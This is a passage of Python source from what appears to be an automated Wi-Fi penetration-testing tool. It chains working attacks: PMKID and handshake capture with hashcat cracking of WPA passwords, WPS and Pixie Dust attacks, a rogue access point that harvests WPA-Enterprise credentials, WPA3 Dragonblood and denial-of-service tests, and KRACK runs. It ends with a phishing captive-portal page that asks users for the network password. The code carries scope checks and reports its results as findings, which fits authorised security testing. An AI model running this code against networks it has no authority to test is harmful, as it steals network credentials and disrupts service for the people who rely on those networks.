    log(f"[0] END: WEP Testing — processed {len(wep_aps)} network(s)")
    status("p0_wep", "Phase 0: WEP Testing", "complete")


# ── Phase 1a: hcxdumptool — clientless PMKID capture + hashcat cracking ───────

def phase_pmkid(
    monitor_iface: str,
    target_aps: list[dict],
    output_dir: Path,
    timeout: int = 60,
    wordlist: str | None = None,
    hashcat_rules: list[str] | None = None,
) -> None:
    """
    Phase 1a: Dedicated PMKID clientless capture using hcxdumptool.
    The PMKID attack requires only a single frame exchange with the AP —
    no connected clients and no deauthentication needed.
    After capture, attempts hashcat cracking with staged wordlists + rules.

    Tool chain: hcxdumptool → hcxpcapngtool → hashcat (-m 22000)
    """
    _check_pause()
    if not shutil.which("hcxdumptool") or not shutil.which("hcxpcapngtool"):
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "skipped",
               "hcxdumptool / hcxpcapngtool not installed")
        return

    scoped_aps = [ap for ap in target_aps if _in_scope(ap)]
    if not scoped_aps:
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "skipped", "no targets")
        return

    status("p1a_pmkid", "Phase 1a: PMKID Capture", "running")
    log(f"[1a] START: PMKID Clientless Capture — {len(scoped_aps)} AP(s) in scope, timeout={timeout}s")
    pmkid_dir = output_dir / "pmkid"
    pmkid_dir.mkdir(parents=True, exist_ok=True)

    # Build BSSID filter file for hcxdumptool
    bssid_filter = pmkid_dir / "bssids.txt"
    bssids = [ap["bssid"] for ap in scoped_aps if ap.get("bssid")]
    if bssids:
        bssid_filter.write_text("\n".join(bssids) + "\n", encoding="utf-8")

    pcapng_file = pmkid_dir / "capture.pcapng"
    cmd = [
        "sudo", "hcxdumptool",
        "-i", monitor_iface,
        "-w", str(pcapng_file),
        "--rds=1",              # randomize source MAC per frame
    ]
    if bssids:
        cmd += [f"--filterlist_ap={bssid_filter}", "--filtermode=2"]

    log(f"[1a] hcxdumptool: PMKID capture ({timeout}s, {len(bssids)} target(s))")
    proc = None
    try:
        proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _pause_sleep(timeout)
    except Exception:
        pass
    finally:
        if proc is not None:
            _kill_proc(proc)

    if not pcapng_file.exists() or pcapng_file.stat().st_size == 0:
        log("[1a] hcxdumptool: no capture data collected")
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")
        return

    # Convert pcapng → hc22000
    hc22000_file = pmkid_dir / "hashes.hc22000"
    conv_out, rc = _run([
        "hcxpcapngtool",
        "-o", str(hc22000_file),
        str(pcapng_file),
    ], timeout=60)
    log(conv_out.strip())

    if not hc22000_file.exists() or hc22000_file.stat().st_size == 0:
        log("[1a] hcxpcapngtool: no PMKID/EAPOL hashes extracted")
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")
        return

    # Count extracted hashes and emit a finding for each SSID captured
    hash_lines = [l for l in hc22000_file.read_text(encoding="utf-8").splitlines() if l.strip()]
    log(f"[1a] Extracted {len(hash_lines)} PMKID/EAPOL hash(es)")
    seen_ssids: set[str] = set()
    for hl in hash_lines:
        # hc22000 format: type*bssid_hex*client_hex*essid_hex*hash
        parts = hl.split("*")
        if len(parts) >= 4:
            try:
                ssid_from_hash = bytes.fromhex(parts[3]).decode("utf-8", errors="replace")
            except Exception:
                ssid_from_hash = ""
            if ssid_from_hash and ssid_from_hash not in seen_ssids:
                seen_ssids.add(ssid_from_hash)
                finding_from_cat(
                    "AETHER-017",
                    data={"ssid": ssid_from_hash, "hash_file": str(hc22000_file)},
                    output_file=str(hc22000_file),
                    title_override=f"PMKID / EAPOL Hash Captured: {ssid_from_hash}",
                )

    # Attempt hashcat cracking if available
    if not shutil.which("hashcat"):
        log("[1a] hashcat not available — hash file saved for external cracking")
        status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")
        return

    rules = hashcat_rules or []
    # Stage 1: wordlist only (targeted)
    stages: list[tuple[str | None, str | None]] = [(wordlist, None)]
    # Stage 2+: wordlist + each rule file
    for rule in rules:
        if os.path.exists(rule):
            stages.append((wordlist, rule))

    for stage_wl, stage_rule in stages:
        if not stage_wl or not os.path.exists(stage_wl):
            continue
        hc_cmd = [
            "hashcat", "-m", "22000",
            "--potfile-path", str(pmkid_dir / "hashcat.potfile"),
            "--status", "--status-timer", "30",
            str(hc22000_file), stage_wl,
        ]
        if stage_rule:
            hc_cmd += ["-r", stage_rule]
            log(f"[1a] hashcat: stage with rule {Path(stage_rule).name}")
        else:
            log(f"[1a] hashcat: stage — wordlist only")
        hc_out, _ = _run(hc_cmd, timeout=600)
        # Extract cracked results from potfile
        potfile = pmkid_dir / "hashcat.potfile"
        if potfile.exists():
            for pot_line in potfile.read_text(encoding="utf-8").splitlines():
                if ":" in pot_line:
                    psk = pot_line.rsplit(":", 1)[-1]
                    # Find matching SSID from hash line
                    for hl in hash_lines:
                        parts = hl.split("*")
                        if len(parts) >= 4 and pot_line.split(":")[0] in hl:
                            try:
                                ssid_crack = bytes.fromhex(parts[3]).decode("utf-8", errors="replace")
                            except Exception:
                                ssid_crack = "unknown"
                            finding_from_cat(
                                "AETHER-001",
                                data={"ssid": ssid_crack, "psk": psk,
                                      "attack": "PMKID + hashcat"},
                                output_file=str(hc22000_file),
                                title_override=f"WPA PSK Cracked via PMKID: {ssid_crack}",
                            )
                            break

    log("[1a] END: PMKID Capture — hash extraction and cracking attempts complete")
    status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")


# ── Phase 1b: wifite2 — WPA/WPA2/WPA3 handshake + WPS ───────────────────────
# wifite2 — originally derv82, actively maintained by kimocoder

def phase_wifite(
    monitor_iface: str,
    target_ssids: list,
    target_bssids: list,
    target_aps: list[dict],
    wordlist: str | None,
    output_dir: Path,
    timeout: int = 300,
) -> None:
    """
    Phase 1b: wifite2 automated WPA/WPA2/WPA3 handshake + WPS attacks.
    Uses the SSID-seeded wordlist (mutations from SSID name merged with the
    base wordlist) to improve cracking success rates over wordlist alone.
    """
    _check_pause()
    wifite_path = shutil.which("wifite") or shutil.which("wifite2")
    if not wifite_path:
        log("[~] wifite2 not installed — skipping Phase 1b")
        status("p1b_wifite", "Phase 1b: WPA Handshake + WPS", "skipped",
               "wifite2 not installed")
        return

    status("p1b_wifite", "Phase 1b: WPA Handshake + WPS", "running")
    log(f"[1b] START: wifite2 WPA/WPA2/WPA3 + WPS — timeout={timeout}s, "
        f"SSIDs={target_ssids or '(all)'}, wordlist={'yes' if wordlist else 'none'}")
    wifite_dir = output_dir / "wifite"
    wifite_dir.mkdir(parents=True, exist_ok=True)

    # 5GHz channels start at 36; add --5ghz so wifite scans the correct band
    has_5ghz = any(ap.get("channel", 0) >= 36 for ap in target_aps)
    cmd = [
        "sudo", wifite_path,
        "--kill",
        "--wpa",
        "--wps",
        "--pmkid",
        "-i", monitor_iface,
        "--wpat",  str(min(timeout, 60)),
        "--wpadt", "10",
    ]
    if has_5ghz:
        cmd.append("--5ghz")

    def _parse_output(out_lines: list[str], ssid: str, out_file: Path) -> None:
        seen: set[str] = set()
        for line in out_lines:
            # Negative-match guard: wifite2 prints lines like
            #   "[!] Skipping. Target is using WPA-Enterprise and can not be cracked."
            # and the literal substring "cracked" used to trip the old positive
            # regex below.  Skip these phrases before any success matching.
            if re.search(
                r'(?:can\s*not\s*be\s*cracked|cannot\s*be\s*cracked'
                r'|WPA[- ]?Enterprise|skipping[\.\s]|marked\s+as\s+failed'
                r'|target\s+is\s+using\s+wpa-enterprise)',
                line, re.I
            ):
                continue
            # Positive-match: wifite2 reports a successful crack with explicit
            # markers — the PSK value is on the same line.  Anchor on those.
            m = re.search(
                r'(?:'
                r'Cracked\s+PMKID\s+Hash'
                r'|Cracked\s+WPA\s+Handshake\s+PSK'
                r'|WPA\s+Pre[- ]?Shared\s+Key'
                r'|cracked\s+wpa[2-3]?\s+key'
                r')\s*[:\s]+(\S+)',
                line, re.I,
            )
            if m:
                psk   = m.group(1)
                title = f"Wireless Vulnerability: WPA Pre-Shared Key Cracked: {ssid}"
                if title not in seen:
                    seen.add(title)
                    finding_from_cat(
                        "AETHER-001",
                        data={"ssid": ssid, "psk": psk, "attack": "wifite2"},
                        output_file=str(out_file),
                        title_override=title,
                    )
            if re.search(
                r'(?:WPA handshake:|saved.*\.cap|\.hc22000|PMKID captured'
                r'|\[\+\].*(?:handshake|PMKID).*captured)',
                line, re.I
            ):
                title = f"Wireless Vulnerability: WPA Handshake / PMKID Captured: {ssid}"
                if title not in seen:
                    seen.add(title)
                    finding_from_cat(
                        "AETHER-002",
                        data={"ssid": ssid},
                        output_file=str(out_file),
                        title_override=title,
                    )
            if re.search(r'WPS.*?pin|pixie.*?dust|wps.*?cracked', line, re.I):
                title = f"Wireless Vulnerability: WPS PIN / Pixie Dust Succeeded: {ssid}"
                if title not in seen:
                    seen.add(title)
                    finding(
                        title=title,
                        severity="CRITICAL",
                        description=(
                            f"wifite2 cracked WPS on '{ssid}' via Pixie Dust or PIN "
                            f"brute-force. The AP's WPS is vulnerable and the full "
                            f"WPA2 key is exposed."
                        ),
                        data={"ssid": ssid},
                        output_file=str(out_file),
                        cvss_score=8.8,
                        cvss_vector="AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    )

    def _run_wifite(extra_args: list, out_file: Path, label: str,
                    merged_wl: str | None) -> None:
        _cmd = cmd[:]
        if merged_wl and os.path.exists(merged_wl):
            _cmd += ["--dict", merged_wl]
        _cmd += extra_args
        wifite_deadline = timeout + 30
        try:
            # start_new_session isolates wifite + its children (airodump-ng,
            # aireplay-ng) into their own process group so we can kill them all
            # reliably on timeout.  communicate() is used instead of readline()
            # because wifite2 emits \r-terminated progress lines; readline()
            # would block indefinitely waiting for \n.
            proc = subprocess.Popen(
                _cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                cwd=str(wifite_dir),
                start_new_session=True,
            )
            try:
                raw_out, _ = proc.communicate(timeout=wifite_deadline)
            except subprocess.TimeoutExpired:
                log(f"[1b] wifite2 deadline ({wifite_deadline}s) reached — killing")
                try:
                    os.killpg(proc.pid, signal.SIGTERM)
                    time.sleep(2)
                    os.killpg(proc.pid, signal.SIGKILL)
                except Exception:
                    pass
                raw_out, _ = proc.communicate()
            out_lines = _strip_ansi(
                raw_out.decode("utf-8", errors="replace")
            ).splitlines()
            for ln in out_lines:
                if ln.strip():
                    log(ln)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
            _parse_output(out_lines, label, out_file)
        except Exception as exc:
            err(f"wifite2 error ({label}): {exc}")

    # WPA-Enterprise targets do not have a PSK to recover — Phase 1b's tooling
    # (wifite2 PSK / PMKID / WPS) cannot apply to them.  They are routed to
    # Phase 2 (EAPHammer + asleap).  Detect via the AP's encryption/auth/cipher
    # blob: airodump-ng tags enterprise as 'WPA2 EAP', 'MGT', or '802.1X'.
    def _is_enterprise(ap: dict) -> bool:
        blob = " ".join([str(ap.get(k, "")) for k in
                         ("encryption", "auth", "cipher")])
        return bool(re.search(r'\bWPA\d?\s*EAP\b|Enterprise|\bMGT\b|802\.1X',
                              blob, re.I))

    if target_ssids:
        # Pre-build a {SSID: BSSID} map from target_aps so each iteration can
        # pair the right BSSID with the right SSID.  Falls back to operator-
        # supplied target_bssids (single-SSID case) or omits --bssid entirely
        # when no match is available.
        ssid_to_bssid = {a.get("ssid"): a.get("bssid")
                         for a in target_aps if a.get("ssid") and a.get("bssid")}
        for ssid in target_ssids:
            ap_match = next((a for a in target_aps
                             if a.get("ssid") == ssid), None)
            if ap_match and _is_enterprise(ap_match):
                log(f"[1b] '{ssid}' is WPA-Enterprise — skipping Phase 1b "
                    "(PSK / PMKID / WPS attacks do not apply; Phase 2 / "
                    "EAPHammer handles enterprise targets)")
                continue
            merged_wl = _generate_ssid_wordlist(ssid, wordlist)
            extra = ["--essid", ssid]
            # Pair the correct BSSID with this SSID.  Prior versions blindly
            # used target_bssids[0] for every SSID iteration, so a multi-SSID
            # campaign always paired the SECOND SSID with the FIRST BSSID and
            # wifite2's AND-filter never matched — five-minute scans with
            # zero targets.  v1.12.3 fixes this by looking up per-SSID BSSID.
            bssid_for_ssid = ssid_to_bssid.get(ssid)
            if bssid_for_ssid:
                extra += ["--bssid", bssid_for_ssid]
            elif target_bssids and len(target_ssids) == 1:
                # Single-SSID legacy path — the lone BSSID applies.
                extra += ["--bssid", target_bssids[0]]
            else:
                log(f"[1b] '{ssid}': no matching BSSID in intel scan — "
                    "filtering by ESSID only")
            safe = re.sub(r'[^\w]', '_', ssid)
            log(f"[1b] wifite2: targeting '{ssid}'"
                + (f" [{bssid_for_ssid}]" if bssid_for_ssid else ""))
            _run_wifite(extra, wifite_dir / f"wifite_{safe}.txt", ssid, merged_wl)
            # Clean up temp wordlist — but preserve project-dir files
            # (they're evidence per the universal output structure).
            if (merged_wl and merged_wl != wordlist
                    and os.path.exists(merged_wl)
                    and not _is_project_wordlist(merged_wl)):
                try:
                    os.unlink(merged_wl)
                except Exception:
                    pass
    else:
        log("[1b] wifite2: scanning all visible networks")
        _run_wifite([], wifite_dir / "wifite_all.txt", "(all networks)", wordlist)

    log("[1b] END: wifite2 WPA Handshake + WPS attacks complete")
    status("p1b_wifite", "Phase 1b: WPA Handshake + WPS", "complete")


# ── Phase 2: EAPHammer — WPA-Enterprise + asleap cracking ────────────────────
# EAPHammer — by s0lst1c3 (https://github.com/s0lst1c3/eaphammer)

def phase_eaphammer(
    monitor_iface: str, target_aps: list[dict],
    eaphammer_path: str, output_dir: Path,
    auth: str = "wpa-eap", timeout: int = 300,
    asleap_path: str = "",
) -> None:
    """
    Phase 2: EAPHammer rogue AP + optional asleap offline cracking.
    After EAPHammer captures MSCHAPv2 challenge/response, asleap is run
    against the credential files to attempt offline dictionary-based cracking.
    """
    _check_pause()
    if not os.path.exists(eaphammer_path):
        log(f"[~] EAPHammer not found at {eaphammer_path} — skipping Phase 2")
        status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "skipped",
               "not installed")
        return

    status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "running")
    log(f"[2] START: EAPHammer WPA-Enterprise — auth={auth}, timeout={timeout}s")
    eap_dir = output_dir / "eaphammer"
    eap_dir.mkdir(parents=True, exist_ok=True)

    enterprise_aps = [
        ap for ap in target_aps
        if _in_scope(ap)
        and re.search(r'WPA.*EAP|Enterprise|802\.1X', ap.get("encryption", ""), re.I)
    ]
    if not enterprise_aps and target_aps:
        enterprise_aps = [ap for ap in target_aps[:3] if _in_scope(ap)]
    if not enterprise_aps:
        log("[~] EAPHammer: no WPA-Enterprise targets — skipping")
        status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "skipped",
               "no enterprise targets")
        return

    # Resolve asleap binary
    _asleap = (asleap_path if asleap_path and os.path.exists(asleap_path)
               else shutil.which("asleap") or "")

    for ap in enterprise_aps[:3]:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        if not ssid:
            continue

        cred_dir = eap_dir / re.sub(r'[^\w]', '_', ssid)
        cred_dir.mkdir(parents=True, exist_ok=True)
        out_file = eap_dir / f"eaphammer_{re.sub(r'[^\w]', '_', ssid)}.txt"

        cmd = [
            "sudo", "python3", eaphammer_path,
            "--interface", monitor_iface,
            "--channel", str(channel),
            "--essid", ssid,
            "--auth", auth,
            "--creds", "--creds-output", str(cred_dir),
        ]
        if bssid:
            cmd += ["--bssid", bssid]

        log(f"[2] EAPHammer: rogue AP '{ssid}' ch={channel} auth={auth}")
        cred_found = False
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if proc.stdout is None:
                raise RuntimeError("EAPHammer stdout unavailable")
            out_lines: list[str] = []
            deadline = time.time() + timeout
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                if not cred_found and re.search(
                    r'challenge|response|MSCHAPv2|username|password', decoded, re.I
                ):
                    cred_found = True
                    finding_from_cat(
                        "AETHER-003",
                        data={"ssid": ssid, "bssid": bssid, "auth": auth,
                              "creds_dir": str(cred_dir)},
                        output_file=str(cred_dir),
                        title_override=f"WPA-Enterprise Credentials Captured: {ssid}",
                    )
            _kill_proc(proc)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
        except Exception as exc:
            err(f"EAPHammer error: {exc}")
            continue

        # asleap post-processing: attempt offline MSCHAPv2 cracking
        if cred_found and _asleap:
            _run_asleap(_asleap, cred_dir, ssid, out_file)

    log(f"[2] END: EAPHammer — tested {len(enterprise_aps[:3])} enterprise AP(s)")
    status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "complete")


def _run_asleap(asleap_bin: str, cred_dir: Path, ssid: str,
                out_file: Path) -> None:
    """Run asleap against EAPHammer-captured NetNTLMv2/MSCHAPv2 hash files."""
    # EAPHammer writes challenge:response or .netntlm files in cred_dir
    hash_files = (
        list(cred_dir.glob("*.netntlm")) +
        list(cred_dir.glob("*.txt")) +
        list(cred_dir.glob("creds-*"))
    )
    if not hash_files:
        return
    for hf in hash_files[:3]:
        content = hf.read_text(encoding="utf-8", errors="replace")
        # Look for challenge:response format used by asleap
        m = re.search(
            r'(?:challenge|chall)[:\s]+([0-9a-fA-F]+).*?'
            r'(?:response|resp)[:\s]+([0-9a-fA-F]+)',
            content, re.I | re.DOTALL,
        )
        if not m:
            continue
        challenge = m.group(1)
        response  = m.group(2)
        log(f"[2] asleap: cracking MSCHAPv2 hash for {ssid!r}")
        asleap_out, _ = _run([
            asleap_bin,
            "-C", challenge,
            "-R", response,
        ], timeout=120)
        log(asleap_out)
        pw_m = re.search(r'(?:password|passwd|pw)[:\s]+(\S+)', asleap_out, re.I)
        if pw_m:
            finding_from_cat(
                "AETHER-018",
                data={"ssid": ssid, "password": pw_m.group(1),
                      "hash_file": str(hf)},
                output_file=str(out_file),
                title_override=f"MSCHAPv2 Cracked via asleap: {ssid}",
            )


# ── Phase 3: dragonslayer — WPA3 SAE cryptographic testing ───────────────────
# dragonslayer — by Mathy Vanhoef @vanhoefm (https://github.com/vanhoefm/dragonslayer)

_DRAGON_MODE: dict[int, tuple[str, list[str]]] = {
    0: ("AETHER-005", ["CVE-2019-9494"]),
    1: ("AETHER-004", ["CVE-2019-9494", "CVE-2019-9495"]),
    2: ("AETHER-006", ["CVE-2019-9495", "CVE-2019-9497", "CVE-2019-9498", "CVE-2019-9499"]),
    3: ("AETHER-007", ["CVE-2019-9500", "CVE-2019-9501", "CVE-2019-9502"]),
}


def phase_dragonslayer(
    monitor_iface: str, target_aps: list[dict],
    dragonslayer_client: str, output_dir: Path,
    attack: int = 1, client_conf: str = "", timeout: int = 180,
) -> None:
    _check_pause()
    if not os.path.exists(dragonslayer_client):
        log(f"[~] dragonslayer not found at {dragonslayer_client} — skipping Phase 3")
        status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "skipped", "not installed")
        return

    status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "running")
    log(f"[3] START: dragonslayer WPA3 SAE — attack mode {attack}, timeout={timeout}s")
    ds_dir = output_dir / "dragonslayer"
    ds_dir.mkdir(parents=True, exist_ok=True)

    cat_id, cves = _DRAGON_MODE.get(attack, ("AETHER-004", ["CVE-2019-9494"]))

    wpa3_aps = [
        ap for ap in target_aps
        if _in_scope(ap) and re.search(r'WPA3|SAE', ap.get("encryption", ""), re.I)
    ]
    if not wpa3_aps:
        log("[~] dragonslayer: no WPA3/SAE targets — running against all in-scope targets")
        wpa3_aps = [ap for ap in target_aps[:3] if _in_scope(ap)]

    for ap in wpa3_aps[:3]:
        ssid      = ap.get("ssid", "unknown")
        safe_ssid = re.sub(r'[^\w]', '_', ssid)
        out_file  = ds_dir / f"dragonslayer_{safe_ssid}_attack{attack}.txt"

        conf_content = (
            f'network={{\n    ssid="{ssid}"\n    key_mgmt=SAE\n    sae_groups=19\n}}\n'
        )
        target_conf = str(ds_dir / f"client_{safe_ssid}.conf")
        try:
            with open(target_conf, "w") as cf:
                cf.write(conf_content)
        except Exception:
            target_conf = client_conf

        cmd = ["sudo", "bash", dragonslayer_client,
               "-i", monitor_iface, "-a", str(attack)]
        if target_conf:
            cmd += ["-c", target_conf]

        log(f"[3] dragonslayer: mode {attack} ({', '.join(cves)}) → '{ssid}'")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          cwd=str(os.path.dirname(dragonslayer_client)))
            if proc.stdout is None:
                raise RuntimeError("dragonslayer stdout unavailable")
            out_lines: list[str] = []
            deadline = time.time() + timeout
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                if re.search(
                    r'vulnerable|attack succeed|reflection|invalid curve|zero.scalar',
                    decoded, re.I,
                ):
                    finding_from_cat(
                        cat_id,
                        data={"ssid": ssid, "attack_mode": attack, "cves": cves},
                        output_file=str(out_file),
                        title_override=f"WPA3 SAE Dragonblood Mode {attack}: {ssid}",
                    )
            _kill_proc(proc)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
        except Exception as exc:
            err(f"dragonslayer error: {exc}")

    log(f"[3] END: dragonslayer — tested {len(wpa3_aps[:3])} target(s)")
    status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "complete")


# ── Phase 4: dragondrain — WPA3 SAE resource exhaustion ──────────────────────

def phase_dragondrain(
    monitor_iface: str, target_aps: list[dict],
    dragondrain_path: str, output_dir: Path,
    timeout: int = 60,
) -> None:
    """Finding only emitted when tool output explicitly reports AP exhaustion."""
    _check_pause()
    if not os.path.exists(dragondrain_path):
        log(f"[~] dragondrain not found — skipping Phase 4")
        status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "skipped",
               "not installed")
        return

    status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "running")
    log(f"[4] START: dragondrain WPA3 SAE DoS — timeout={timeout}s")
    drain_dir = output_dir / "dragondrain"
    drain_dir.mkdir(parents=True, exist_ok=True)

    for ap in [ap for ap in target_aps[:3] if _in_scope(ap)]:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        if not bssid:
            continue
        safe     = re.sub(r'[^\w]', '_', ssid or bssid)
        out_file = drain_dir / f"dragondrain_{safe}.txt"
        cmd = [
            "sudo", dragondrain_path,
            "-d", monitor_iface, "-a", bssid, "-c", str(channel),
            "-n", "10", "-r", "20", "-g", "21",
        ]
        log(f"[4] dragondrain: {ssid!r} [{bssid}]")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if proc.stdout is None:
                raise RuntimeError("dragondrain stdout unavailable")
            out_lines: list[str] = []
            deadline  = time.time() + timeout
            confirmed = False
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                if re.search(
                    r'exhausted|overflow|cpu|saturated|timed?\s*out|no\s*response',
                    decoded, re.I,
                ):
                    confirmed = True
            _kill_proc(proc)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
            if confirmed:
                finding_from_cat(
                    "AETHER-008",
                    data={"ssid": ssid, "bssid": bssid},
                    output_file=str(out_file),
                    title_override=f"WPA3 SAE Resource Exhaustion Confirmed: {ssid}",
                )
            else:
                log(f"[4] dragondrain: no exhaustion indicators for {ssid!r}")
        except Exception as exc:
            err(f"dragondrain error: {exc}")

    log("[4] END: dragondrain resource exhaustion testing complete")
    status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "complete")


# ── Phase 5: krackattacks — WPA2 KRACK key reinstallation testing ─────────────

def phase_krack(
    interface: str, target_aps: list[dict],
    krackattacks_path: str, output_dir: Path,
    timeout: int = 180,
) -> None:
    _check_pause()
    if not os.path.exists(krackattacks_path):
        log("[~] krackattacks-scripts not found — skipping Phase 5")
        status("p5_krack", "Phase 5: KRACK Testing", "skipped", "not installed")
        return

    hostapd_bin = os.path.realpath(
        os.path.join(os.path.dirname(krackattacks_path), os.pardir,
                     "hostapd", "hostapd")
    )
    if not os.path.isfile(hostapd_bin):
        log("[5] krackattacks hostapd binary not found — Phase 5 requires compiling "
            "the bundled hostapd first")
        log("[5]   cd /opt/krackattacks-scripts && sudo bash krackattack/compile.sh")
        status("p5_krack", "Phase 5: KRACK Testing", "skipped", "hostapd not compiled")
        return

    status("p5_krack", "Phase 5: KRACK Testing", "running")
    log(f"[5] START: KRACK key-reinstallation testing — {len(test_variants)} variants, timeout={timeout}s")
    krack_dir = output_dir / "krack"
    krack_dir.mkdir(parents=True, exist_ok=True)

    hwcrypto = os.path.join(os.path.dirname(krackattacks_path),
                             "disable-hwcrypto.sh")
    if os.path.exists(hwcrypto):
        log("[5] Disabling hardware crypto...")
        _run(["sudo", "bash", hwcrypto])

    test_variants = [
        ([],           "standard 4-way", "CVE-2017-13077", "AETHER-009"),
        (["--group"],  "group key",      "CVE-2017-13080", "AETHER-011"),
        (["--tptk"],   "TPTK variant",   "CVE-2017-13078", "AETHER-010"),
    ]

    for ap in [ap for ap in target_aps[:3] if _in_scope(ap)]:
        ssid  = ap.get("ssid", "")
        bssid = ap.get("bssid", "")
        if not bssid:
            continue
        safe = re.sub(r'[^\w]', '_', ssid or bssid)

        for flags, variant, cve, cat_id in test_variants:
            out_file = krack_dir / f"krack_{safe}_{variant.replace(' ', '_')}.txt"
            cmd = (["sudo", "python3", krackattacks_path]
                   + flags + ["--bssid", bssid])
            log(f"[5] KRACK {variant} ({cve}) → '{ssid}'")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              cwd=str(os.path.dirname(krackattacks_path)))
                if proc.stdout is None:
                    raise RuntimeError("krackattacks stdout unavailable")
                out_lines: list[str] = []
                deadline = time.time() + timeout
                while True:
                    line = _readline_timed(proc.stdout, deadline)
                    if line is None:
                        break
                    decoded = _strip_ansi(
                        line.decode("utf-8", errors="replace").rstrip()
                    )
                    log(decoded)
                    out_lines.append(decoded)
                    if re.search(r'VULNERABLE|reinstalled|attack worked', decoded, re.I):
                        finding_from_cat(
                            cat_id,
                            data={"ssid": ssid, "bssid": bssid,
                                  "cve": cve, "variant": variant},
                            output_file=str(out_file),
                            title_override=f"WPA2 KRACK {variant.title()} ({cve}): {ssid}",
                        )
                _kill_proc(proc)
                out_file.write_text("\n".join(out_lines), encoding="utf-8")
            except Exception as exc:
                err(f"KRACK {variant} error: {exc}")

    log("[5] END: KRACK testing complete")
    status("p5_krack", "Phase 5: KRACK Testing", "complete")



# ── Captive portal constants ─────────────────────────────────────────────────

_CAPTIVE_IP   = "192.168.88.1"
_CAPTIVE_CIDR = "192.168.88.0/24"
_CAPTIVE_PORT = 8080
_CAPTIVE_DHCP_START = "192.168.88.100"
_CAPTIVE_DHCP_END   = "192.168.88.200"

_CAPTIVE_HTML = """\
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network Login</title>
<style>
body{{margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;
     background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}}
.card{{background:#fff;border-radius:12px;padding:2.5rem;width:90%;max-width:380px;
      box-shadow:0 4px 24px rgba(0,0,0,.12)}}
h2{{margin:0 0 .5rem;font-size:20px;color:#1a1a2e}}
p{{margin:0 0 1.5rem;font-size:14px;color:#555;line-height:1.5}}
label{{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:.4rem}}
input{{width:100%;box-sizing:border-box;padding:.7rem 1rem;border:1.5px solid #ddd;
      border-radius:8px;font-size:15px;outline:none}}
input:focus{{border-color:#4a9ad0}}
button{{width:100%;padding:.85rem;margin-top:1rem;background:#4a9ad0;color:#fff;
        border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}}
button:hover{{background:#3a8ac0}}
.hint{{font-size:12px;color:#888;margin-top:.4rem}}
.err{{color:#e74c3c;font-size:13px;margin-top:.5rem}}
</style></head>
<body><div class="card">
<h2>&#128246; {ssid}</h2>
<p>Your wireless session has expired. Please re-enter the network password to continue.</p>
<form method="POST" action="/"><label>Wi-Fi Password</label>
<input type="password" name="psk" placeholder="Network password" required autofocus>
{error}
<button type="submit">Continue</button>
<div class="hint">You will be reconnected automatically after authenticating.</div>
</form></div></body></html>"""

_CAPTIVE_SUCCESS_HTML = """\
<!DOCTYPE html><html><head><meta charset="utf-8"><title>Connecting...</title>
<style>body{{font-family:-apple-system,sans-serif;display:flex;justify-content:center;
align-items:center;min-height:100vh;background:#f0f2f5}}
.card{{background:#fff;border-radius:12px;padding:2.5rem;text-align:center;
box-shadow:0 4px 24px rgba(0,0,0,.12)}}h2{{color:#27ae60}}</style></head>
<body><div class="card"><h2>&#10003; Connected</h2>
<p>Reconnecting to the network, please wait...</p></div></body></html>"""

_cracked_psks: dict = {}


# ── Rogue AP / captive portal helpers ────────────────────────────────────────

def _find_ap_interface(exclude_ifaces: list) -> str:
    if platform.system() != "Linux":
        return ""
    net = Path("/sys/class/net")
    if not net.exists():
        return ""
    for p in sorted(net.iterdir()):
        name = p.name
        if name in exclude_ifaces:
            continue
        if not ((p / "wireless").exists() or (p / "phy80211").exists()):
            continue
        try:
            out, _ = _run(["iw", "dev", name, "info"], timeout=5)
            m = re.search(r"wiphy\s+(\d+)", out)
            if not m:
                continue
            phy_out, _ = _run(["iw", "phy", f"phy{m.group(1)}", "info"], timeout=5)
            if re.search(r"^\s+\* AP\b", phy_out, re.M):
                return name
        except Exception:
            pass
